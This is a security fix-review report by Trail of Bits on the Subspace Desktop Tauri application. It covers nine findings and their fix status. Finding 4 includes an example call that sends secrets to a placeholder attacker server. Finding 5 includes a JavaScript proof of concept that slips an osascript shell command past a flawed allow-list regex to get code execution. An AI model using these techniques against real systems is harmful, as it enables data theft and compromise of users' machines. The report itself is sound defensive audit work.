# Subspace Network, Subspace

 Desktop
 Fix Review
 January 23, 2023
 Prepared for:
 Arthur Chiu
 Subspace Network
 Prepared by:  Vasco Franco and Artur Cygan

 About Trail of Bits
 Founded in 2012 and headquartered in New York, Trail of Bits provides technical security assessment and advisory services to some of the world’s most targeted organizations. We combine high- end security research with a real -world attacker mentality to reduce risk and fortify code. With 100+ employees around the globe, we’ve helped secure critical software elements that support billions of end users, including Kubernetes and the Linux kernel.
 We maintain an exhaustive list of publications at  https://github.com/trailofbits/publications , with links to papers, presentations, public audit reports, and podcast appearances.
 In recent years, Trail of Bits consultants have showcased cutting-edge research through presentations at CanSecWest, HCSS, Devcon, Empire Hacking, GrrCon, LangSec, NorthSec, the O’Reilly Security Conference, PyCon, REcon, Security BSides, and SummerCon.
 We specialize in software testing and code review projects, supporting client organizations in the technology, defense, and ﬁnance industries, as well as government entities. Notable clients include HashiCorp, Google, Microsoft, Western Digital, and Zoom.
 Trail of Bits also operates a center of excellence with regard to blockchain security. Notable projects include audits of Algorand, Bitcoin SV, Chainlink, Compound, Ethereum 2.0,
 MakerDAO, Matic, Uniswap, Web3, and Zcash.
 To keep up to date with our latest news and announcements, please follow  @trailofbits  on
 Twitter and explore our public repositories at  https://github.com/trailofbits .  To engage us directly, visit our “Contact” page at  https://www.trailofbits.com/contact ,  or email us at info@trailofbits.com .
 Trail of Bits, Inc.
 228 Park Ave S #80688
 New York, NY 10003 https://www.trailofbits.com info@trailofbits.com
 Trail of Bits 1

 Notices and Remarks
 Copyright and Distribution
 © 2022 by Trail of Bits, Inc.
 All rights reserved. Trail of Bits hereby asserts its right to be identiﬁed as the creator of this report in the United Kingdom.
 This report is considered by Trail of Bits to be public information;  it is licensed to Subspace
 Network under the terms of the project statement of work and has been made public at
 Subspace Network’s request.  Material within this report  may not be reproduced or distributed in part or in whole without the express written permission of Trail of Bits.
 The sole canonical source for Trail of Bits publications is the  Trail of Bits Publications page .
 Reports accessed through any source other than that page may have been modiﬁed and should not be considered authentic.
 Test Coverage Disclaimer
 All activities undertaken by Trail of Bits in association with this project were performed in accordance with a statement of work and agreed upon project plan.
 Security assessment projects are time-boxed and often reliant on information that may be provided by a client, its aﬃliates, or its partners. As a result, the ﬁndings documented in this report should not be considered a comprehensive list of security issues, ﬂaws, or defects in the target system or codebase.
 Trail of Bits uses automated testing techniques to rapidly test the controls and security properties of software. These techniques augment our manual security review work, but each has its limitations: for example, a tool may not generate a random edge case that violates a property or may not fully complete its analysis during the allotted time. Their use is also limited by the time and resource constraints of a project.
 When undertaking a ﬁx review, Trail of Bits reviews the ﬁxes implemented for issues identiﬁed in the original report. This work involves a review of speciﬁc areas of the source code and system conﬁguration, not comprehensive analysis of the system.
 Trail of Bits 2

 Table of Contents
 About Trail of Bits 1
 Notices and Remarks 2
 Table of Contents 3
 Executive Summary 5
 Project Summary 6
 Project Methodology 7
 Project Targets 8
 Summary of Fix Review Results 9
 Detailed Fix Review Results 10 1. Desktop application conﬁguration ﬁle stored in group writable ﬁle 10 2. Insuﬃcient validation of users’ reward addresses 11 3. Improper error handling 13 4. Flawed regex in the Tauri conﬁguration 15 5. Insuﬃcient privilege separation between the front end and back end 17 6. Vulnerable dependencies 18 7. Broken error reporting link 20 8. Side eﬀects are triggered regardless of disk_farms validity 21 9. Network conﬁguration path construction is duplicated 23
 A. Status Categories 24
 B. Vulnerability Categories 25
 Trail of Bits 3

 Executive Summary
 Engagement Overview
 Subspace Network engaged Trail of Bits to review the security of its farming application,
 Subspace Desktop. From September 12 to September 23, 2022, a team of two consultants conducted a security review of the client-provided source code, with two person-weeks of eﬀort. Details of the project’s  scope,  timeline,  test targets, and coverage are provided in the original audit report.
 Subspace Network contracted Trail of Bits to review the ﬁxes implemented for issues identiﬁed in the original report. On January 7, 2023, one consultant conducted a review of the client-provided source code.
 Summary of Findings
 The  original  audit uncovered signiﬁcant ﬂaws that  could impact system conﬁdentiality, integrity, or availability. A summary of the ﬁndings is provided below.
 EXPOSURE ANALYSIS
 Severity
 Count
 High 1
 Medium 2
 Low 4
 Informational 2
 CATEGORY BREAKDOWN
 Category
 Count
 Access Controls 1
 Conﬁguration 2
 Data Validation 2
 Error Reporting 2
 Patching 2
 Overview of Fix Review Results
 Of the nine issues reported in the original audit report, Subspace Network has suﬃciently addressed seven and partially addressed one; the remaining issue has not been resolved.
 Trail of Bits 4

 Project Summary
 Contact Information
 The following managers were associated with this project:
 Dan Guido , Account Manager
 Anne Marie Barry , Project  Manager dan@trailofbits.com annemarie.barry@trailofbits.com
 The following engineers were associated with this project:
 Vasco Franco , Consultant
 Artur Cygan , Consultant vasco.franco@trailofbits.com artur.cygan@trailofbits.com
 Project Timeline
 The signiﬁcant events and milestones of the project are listed below.
 Date
 Event
 September 8, 2022
 Pre-project kickoﬀ call
 September 19, 2022
 Status update meeting #1
 September 26, 2022
 Delivery of report draft
 September 26, 2022
 Report readout meeting
 October 20, 2022
 Delivery of ﬁnal report
 January 23, 2023
 Delivery of ﬁx review
 Trail of Bits 5

 Project Methodology
 Our work in the ﬁx review included the following:
 ●  A review of the ﬁndings in the original audit report
 ●  A manual review of the client-provided source code
 Trail of Bits 6

 Project Targets
 The engagement involved a review and testing of the following target.
 Subspace Network, Subspace Desktop
 Repository https://github.com/subspace/subspace-desktop
 Version 3c12cc6a9f1ebcda2a7c01187c8d2b7760154256
 Types
 Rust, TypeScript
 Platforms
 Multiple
 Trail of Bits 7

 Summary of Fix Review Results
 The table below summarizes each of the original ﬁndings and indicates whether the issue has been suﬃciently resolved.
 ID
 Title
 Status 1
 Desktop application conﬁguration ﬁle stored in group writable ﬁle
 Resolved 2
 Insuﬃcient validation of users’ reward addresses
 Resolved 3
 Improper error handling
 Resolved 4
 Flawed regex in the Tauri conﬁguration
 Resolved 5
 Insuﬃcient privilege separation between the front end and back end
 Partially
 Resolved 6
 Vulnerable dependencies
 Unresolved 7
 Broken error reporting link
 Resolved 8
 Side eﬀects are triggered regardless of disk_farms validity
 Resolved 9
 Network conﬁguration path construction is duplicated
 Resolved
 Trail of Bits 8

 Detailed Fix Review Results 1. Desktop application conﬁguration ﬁle stored in group writable ﬁle
 Status:  Resolved
 Severity:  Low
 Diﬃculty:  High
 Type: Access Controls
 Finding ID: TOB-SPDF-1
 Target:  $HOME/.config/subspace-desktop/subspace-desktop.cfg
 Description
 The desktop application conﬁguration ﬁle has group writable permissions, as shown in
 ﬁgure 1.1.
 >>> ls -l $HOME/.config/subspace-desktop/subspace-desktop.cfg
 -rw-rw-r--  1  user user  143  $HOME/.config/subspace-desktop/subspace-desktop.cfg
 Figure 1.1: Permissions of the
 $HOME/.config/subspace-desktop/subspace-desktop.cfg ﬁle
 This conﬁguration ﬁle contains the  rewardAddress ﬁeld (ﬁgure 1.2), to which the
 Subspace farmer sends the farming rewards. Therefore, anyone who can modify this ﬁle can control the address that receives farming rewards. For this reason, only the ﬁle owner should have the permissions necessary to write to it.
 {
 "plot" :  {
 "location" :  "<REDACTED>/.local/share/subspace-desktop/plots" ,
 "sizeGB" :  1
 },
 "rewardAddress" :  "stC2Mgq<REDACTED>" ,
 "launchOnBoot" :  true ,
 "version" :  "0.6.11" ,
 "nodeName" :  "agreeable-toothbrush-4936"
 }
 Figure 1.2: An example of a conﬁguration ﬁle
 Fix Analysis
 The issue is resolved. The code was updated so that the conﬁguration ﬁle is created with permissions that allow only the owner to read and modify the ﬁle.
 Trail of Bits 9

 2. InsuĆcient validation of users’ reward addresses
 Status:  Resolved
 Severity:  Low
 Diﬃculty:  Medium
 Type: Data Validation
 Finding ID: TOB-SPDF-2
 Target:  subspace-desktop/src/pages/ImportKey.vue
 Description
 The code that imports users’ reward addresses does not suﬃciently validate them.
 As shown in ﬁgure 2.1, the “Import Reward Address” prompt indicates that the address should start with the letters “st”.
 Figure 2.1: The “Import Reward Address” prompt
 However, as shown in ﬁgure 2.2, the function that validates the address does not check that the address starts with “st”, and it accepts any hex string as a valid address (e.g.,  0x00  , 0x1337  ).
 isValidSubstrateAddress(val:  string):  boolean  { try  { encodeAddress(isHex(val)  ?  hexToU8a(val)  :  decodeAddress(val)); return  true ;
 }  catch  (error)  { return  false ;
 }
 },
 Figure 2.2:  subspace-desktop/src/pages/ImportKey.vue#L53-L60
 Trail of Bits 10

 Fix Analysis
 The issue is resolved. Validation code to prevent invalid addresses from being imported was added to the UI component.
 Trail of Bits 11

 3. Improper error handling
 Status:  Resolved
 Severity:  Low
 Diﬃculty:  Medium
 Type: Error Reporting
 Finding ID: TOB-SPDF-3
 Target: Multiple locations
 Description
 The front end code handles errors incorrectly in the following cases:
 ●  The Linux auto launcher function  createAutostartDir does not return an error if it fails to create the autostart directory.
 ●  The Linux auto launcher function  enable does not return  an error if it fails to create the autostart ﬁle.
 ●  The Linux auto launcher function  disable does not  return an error if it fails to remove the autostart ﬁle.
 ●  The Linux auto launcher function  isEnabled always  returns  true  , even if it fails to read the autostart ﬁle, which indicates that the auto launcher is disabled.
 ●  The  exportLogs function does not display error messages  to users when errors occur. Instead, it silently fails.
 ●  If  rewardAddress is not set, the  startFarming function  sends an error log to the back end but not to the front end. Despite the error, the function still tries to start farming without a reward address, causing the back end to error out. Without an error message displayed in the front end, the source of the failure is unclear.
 ●  The  Config::init function does not show users an error  message if it fails to create the conﬁguration directory.
 ●  The  Config::write function does not show users an  error message if it fails to create the conﬁguration directory, and it proceeds to try to write to the nonexistent conﬁguration ﬁle. Additionally, it does not show an error message if it fails to write to the conﬁguration ﬁle in its  call to  writeFile  .
 Trail of Bits 12

 ●  The  removePlot function does not return an error if it fails to delete the plots directory.
 ●  The  createPlotDir function does not return an error  if it fails to create the plots folder (e.g., if the given user does not have the permissions necessary to create the folder in that directory). This will cause the  startPlotting function to fail silently; without an error message, the user cannot know the source of the failure.
 ●  The  createAutostartDir function logs an error unnecessarily.  The function determines whether a directory exists by calling the  readDir function; however, even though occasionally the directory may not be found (as expected), the function always logs an error if it is not found.
 Fix Analysis
 The issue is resolved. The code was adjusted so that errors are handled correctly in all of the locations described above.
 Trail of Bits 13

 4. Flawed regex in the Tauri conﬁguration
 Status:  Resolved
 Severity:  Medium
 Diﬃculty:  High
 Type: Conﬁguration
 Finding ID: TOB-SPDF-4
 Target:  subspace-desktop/src-tauri/tauri.conf.json#L81-L92
 Description
 The Tauri conﬁguration that limits which ﬁles the front end can open with the system’s default applications is ﬂawed. As shown in ﬁgure 4.1, the conﬁguration ﬁle uses the
 [/subspace\\-desktop/] regex; the Subspace developers  intended this regex to match
 ﬁle names that include the  /subspace-desktop/ string,  but the regex actually matches any string that has a single character inside the regex's square brackets.
 "shell" :  {
 "all" :  true ,
 "execute" :  true ,
 "open" :  "[/subspace\\-desktop/]" ,
 "scope" :  [
 {
 "name" :  "run-osascript" ,
 "cmd" :  "osascript" ,
 "args" :  true
 }
 ]
 },
 Figure 4.1:  subspace-desktop/src-tauri/tauri.conf.json#L81-L92
 For example,  tauri.shell.open("s") is accepted as  a valid location because  s is inside the regex’s square brackets. Contrarily,  tauri.shell.open("z") is an invalid location because  z is not inside the square brackets.
 Besides opening ﬁles, in Linux, the  tauri.shell.open function will handle anything that the  xdg-open command handles. For example,  tauri.shell.open("apt://firefox")
 shows users a prompt to install Firefox. Attackers could also use the  tauri.shell.open function to make arbitrary HTTP requests and bypass the CSP’s  connect-src directive with calls such as tauri.shell.open("https://<attacker-server>/?secret_data=<secrets>")  .
 Trail of Bits 14

 Fix Analysis
 The issue is resolved. The front end code now sets the  “open” conﬁguration option to false instead of a regex, and the back end code was  updated to serve those ﬁles.
 Trail of Bits 15

 5. InsuĆcient privilege separation between the front end and back end
 Status:  Partially Resolved
 Severity:  Medium
 Diﬃculty:  High
 Type: Conﬁguration
 Finding ID: TOB-SPDF-5
 Target: The Subspace Desktop architecture
 Description
 The Subspace Desktop application’s JavaScript front end can perform many privileged operations, allowing it to elevate its privileges. For example, in Linux, a malicious front end could write to a user’s  .bashrc ﬁle and gain the  ability to execute code when the user opens a shell; a malicious front end could also read a user’s GitHub private key stored in
 ~/.ssh and steal all of the user’s private repositories.
 Although the desktop application has a small attack surface for XSS attacks, this architecture does not provide a defense-in-depth mechanism to prevent a complete system compromise if an attacker ﬁnds and exploits an XSS or open redirect vulnerability.
 Tauri was explicitly designed with this defense-in-depth mechanism in mind. The Rust back end runs the privileged operations (e.g., writing ﬁles to disk, creating connections to databases), and the front end provides the UI without needing to call any privileged operations directly. Read  Tauri's introduction  and  process model  for more information about Tauri's philosophy.
 To take advantage of this Tauri defense-in-depth mechanism, we recommend having the front end invoke the Rust back end when performing any privileged operations, such as writing to conﬁguration ﬁles, writing to autostart ﬁles, running shell commands, and opening ﬁles with the system’s default application.
 Fix Analysis
 The issue is partially resolved. Although the Subspace Network team limited the front end’s capabilities, the front end still has excessive privileges. We identiﬁed the following permissions-related issues that should be addressed:
 ●  The front end is still allowed to run the  run-osascript shell command. While the command can receive only arguments validated by the regex deﬁned in tauri.conf.json#L84  , this regex is ﬂawed and allows  the front end to achieve arbitrary code execution, as exempliﬁed in ﬁgure 5.1. The regex veriﬁes only that
 Trail of Bits 16

 the argument contains the string  tell  application  "System  Events"  to  get the  name  of  every  login  item  , rather than verifying  that the argument is  exactly that string. Therefore, a compromised front end could bypass the regex by instructing  osascript to execute a shell command (highlighted  in red in ﬁgure 5.1)
 and adding the string that the regex validates as a comment afterwards (highlighted in yellow in ﬁgure 5.1). Consider removing the front end’s ability to execute any command and writing three commands in the Rust back end to perform the required actions instead.
 const  args  =  [ '-e' ,  ' do shell script "ls /Applications/"  # tell application "System
 Events" to get the name of every login item ' ]; const  res  =  new  tauri.shell.Command( 'run-osascript' ,  args); res.on( 'error' ,  error  =>  console.log( `command error:  " ${ error } "` )); res.stdout.on( 'data' ,  (line:  string )  =>  { console.log( `command stdout: " ${ line } "` );
 }); res.stderr.on( 'data' ,  (line:  string )  =>  { console.log( `command stderr: " ${ line } "` );
 }); res.spawn()
 Figure 5.1: A proof of concept exemplifying how the front end can achieve arbitrary code execution on a user’s system
 ●  The  create_dir Rust command allows the front end to  fully control the path created. Consider creating a function in Rust for each path that needs to be created.
 ●  Reading from the clipboard is unnecessary; only writing to it is required for the saveKeys functionality. Consider removing the permission  allowing the front end to read from the clipboard.
 ●  Permissions such as  globalShortcut appear not to be  used. Consider removing all unused permissions.
 ●  Some permissions use an  all option but should use  an  allowList option instead.
 Consider creating an allowlist for each API that is required.
 Trail of Bits 17

 6. Vulnerable dependencies
 Status:  Unresolved
 Severity:  High
 Diﬃculty:  High
 Type: Patching
 Finding ID: TOB-SPDF-6
 Target:  cargo.lock  ,  yarn.lock
 Description
 The Subspace Desktop Tauri application uses vulnerable Rust and Node dependencies, as reported by the  cargo  audit and  yarn  audit tools.
 Among the Rust crates used in the Tauri application, two are vulnerable, three are unmaintained, and six are yanked. The table below summarizes the ﬁndings:
 Crate
 Version in
 Use
 Finding
 Latest Safe Version owning_ref 0.4.1
 Memory corruption vulnerability
 ( RUSTSEC-2022-0040 )
 Not available time 0.1.43
 Memory corruption vulnerability
 ( RUSTSEC-2020-0071 )
 0.2.23 and newer ansi_term 0.12.1
 Unmaintained crate
 ( RUSTSEC-2021-0139 )
 Multiple alternatives dotenv 0.15.0
 Unmaintained crate
 ( RUSTSEC-2021-0141 )
 dotenvy xml-rs 0.8.4
 Unmaintained crate
 ( RUSTSEC-2022-0048 )
 quick-xml blake2 0.10.2
 Yanked crate 0.10.4 block-buffer 0.10.0
 Yanked crate 0.10.3 cpufeatures 0.2.1
 Yanked crate 0.2.5 iana-time-zone 0.1.44
 Yanked crate 0.1.50 sp-version 5.0.0
 Yanked crate
 Not available
 Trail of Bits 18

 For the Node dependencies used in the Tauri application, one is vulnerable to a high-severity issue and another is vulnerable to a moderate-severity issue. These vulnerable dependencies appear to be used only in the development dependencies.
 Package
 Finding
 Latest Safe Version got
 CVE-2022-33987  (Moderate severity)
 11.8.5 and newer git-clone
 CVE-2022-25900  (High severity)
 Not available
 Fix Analysis
 The issue is not resolved. The Node and Rust dependencies have not been updated since the audit started. The  yarn  audit tool now reports  5 critical-, 27 high-, 2 moderate-, and 1 low-severity issues.
 Trail of Bits 19

 7. Broken error reporting link
 Status:  Resolved
 Severity:  Low
 Diﬃculty:  Low
 Type: Error Reporting
 Finding ID: TOB-SPDF-7
 Target:  src-tauri/src/node.rs
 Description
 The  create_full_client function calls the  sp_panic_handler::set() function to set a URL for a Discord invitation; however, this invitation is broken. The documentation for the sp_panic_handler::set() function states that “The  bug_url parameter is an invitation for users to visit that URL to submit a bug report in the case where a panic happens.”
 Because the link is broken, users cannot submit bug reports.
 sp_panic_handler::set(
 " https://discord.gg/vhKF9w3x " , env! ( "SUBSTRATE_CLI_IMPL_VERSION" ),
 );
 Figure 7.1:  subspace-desktop/src-tauri/src/node.rs#L169-L172
 Fix Analysis
 The issue is resolved. The Discord invitation link was replaced with a more stable link to the forum: https://forum.subspace.network/.
 Trail of Bits 20

 8. Side eąects are triggered regardless of disk_farms validity
 Status:  Resolved
 Severity:  Informational
 Diﬃculty:  High
 Type: Data Validation
 Finding ID: TOB-SPDF-8
 Target:  src-tauri/src/farmer.rs#L118-L192
 Description
 The  farm function checks the  disk_farms arguments,  which originate from the front end.
 The  farm function’s checks are spread across the code  and are interleaved with code that triggers side eﬀects that do not inﬂuence the subsequent checks of  disk_farms (ﬁgure 8.1). This means that certain side eﬀects could be triggered even if one of the checks determines that a given  disk_farms argument is invalid.
 async  fn  farm ( disk_farms :  Vec <DiskFarm>, farming_args:  FarmingArgs ,
 )  ->  Result <..., ...>  { raise_fd_limit();
 // <redacted>
 // ping node to discover whether it is listening
 //  <redacted side effects> if  disk_farms .is_empty()  { return  Err (anyhow!( "There must be a disk farm  provided" ));
 }
 // Starting the relay server node.
 //  <redacted side effects>
 // TODO: Check plot and metadata sizes to ensure  there is enough space for farmer to not
 //  fail later (note that multiple farms can use  the same location for metadata)
 for  (farm_index,  mut  disk_farm)  in  disk_farms .into_iter().enumerate()  { if  disk_farm.allocated_plotting_space  <  1024  *  1024  { return  Err (anyhow::anyhow!(
 "Plot size is too low ({0} bytes).  Did you mean {0}G or {0}T?" , disk_farm.allocated_plotting_space
 ));
 }
 Figure 8.1:  subspace-desktop/src-tauri/src/farmer.rs#L118-L192
 Trail of Bits 21

 Fix Analysis
 The issue is resolved. The checks were moved to the beginning of the  farm function; it is now no longer possible to trigger side eﬀects with invalid arguments.
 Trail of Bits 22

 9. Network conﬁguration path construction is duplicated
 Status:  Resolved
 Severity:  Informational
 Diﬃculty:  High
 Type: Patching
 Finding ID: TOB-SPDF-9
 Target:  src-tauri/src/node.rs
 Description
 The  create_full_client function contains code that  uses hard-coded strings to indicate conﬁguration paths (ﬁgure 9.1) in place of the previously deﬁned
 DEFAULT_NETWORK_CONFIG_PATH and  NODE_KEY_ED25519_FILE values, which are used in the other parts of the code. This is a risky coding pattern, as a Subspace developer who is updating the  DEFAULT_NETWORK_CONFIG_PATH and  NODE_KEY_ED25519_FILE values may forget to also update the equivalent values used in the  create_full_client function.
 if  primary_chain_node.client.info().best_number  ==  33670  { if  let  Some (config_dir)  =  config_dir  { let  workaround_file  = config_dir.join( "network" ).join( "gemini_1b_workaround" ); if  !workaround_file.exists()  { let  _  =  std::fs::write(workaround_file,  &[]); let  _  = std::fs::remove_file( config_dir.join( "network" ).join( "secret_ed25519" ) ); return  Err (anyhow!(
 "Applied workaround for upgrade from  gemini-1b-2022-jun-08, \ please restart this node"
 ));
 }
 }
 }
 Figure 9.1:  subspace-desktop/src-tauri/src/node.rs#L207-L219
 Fix Analysis
 The issue is resolved. The code was updated to use the already deﬁned
 DEFAULT_NETWORK_CONFIG_PATH and  NODE_KEY_ED25519_FILE constants.
 Trail of Bits 23

 A. Status Categories
 The following table describes the statuses used to indicate whether an issue has been suﬃciently addressed.
 Fix Status
 Status
 Description
 Undetermined
 The status of the issue was not determined during this engagement.
 Unresolved
 The issue persists and has not been resolved.
 Partially Resolved
 The issue persists but has been partially resolved.
 Resolved
 The issue has been suﬃciently resolved.
 Trail of Bits 24

 B. Vulnerability Categories
 The following tables describe the vulnerability categories, severity levels, and diﬃculty levels used in this document.
 Vulnerability Categories
 Category
 Description
 Access Controls
 Insuﬃcient authorization or assessment of rights
 Auditing and Logging
 Insuﬃcient auditing of actions or logging of problems
 Authentication
 Improper identiﬁcation of users
 Conﬁguration
 Misconﬁgured servers, devices, or software components
 Cryptography
 A breach of system conﬁdentiality or integrity
 Data Exposure
 Exposure of sensitive information
 Data Validation
 Improper reliance on the structure or values of data
 Denial of Service
 A system failure with an availability impact
 Error Reporting
 Insecure or insuﬃcient reporting of error conditions
 Patching
 Use of an outdated software package or library
 Session Management
 Improper identiﬁcation of authenticated users
 Testing
 Insuﬃcient test methodology or test coverage
 Timing
 Race conditions or other order-of-operations ﬂaws
 Undeﬁned Behavior
 Undeﬁned behavior triggered within the system
 Trail of Bits 25

 Severity Levels
 Severity
 Description
 Informational
 The issue does not pose an immediate risk but is relevant to security best practices.
 Undetermined
 The extent of the risk was not determined during this engagement.
 Low
 The risk is small or is not one the client has indicated is important.
 Medium
 User information is at risk; exploitation could pose reputational, legal, or moderate ﬁnancial risks.
 High
 The ﬂaw could aﬀect numerous users and have serious reputational, legal, or ﬁnancial implications.
 Diﬃculty Levels
 Diﬃculty
 Description
 Undetermined
 The diﬃculty of exploitation was not determined during this engagement.
 Low
 The ﬂaw is well known; public tools for its exploitation exist or can be scripted.
 Medium
 An attacker must write an exploit or will need in-depth knowledge of the system.
 High
 An attacker must have privileged access to the system, may need to know complex technical details, or must discover other weaknesses to exploit this issue.
 Trail of Bits 26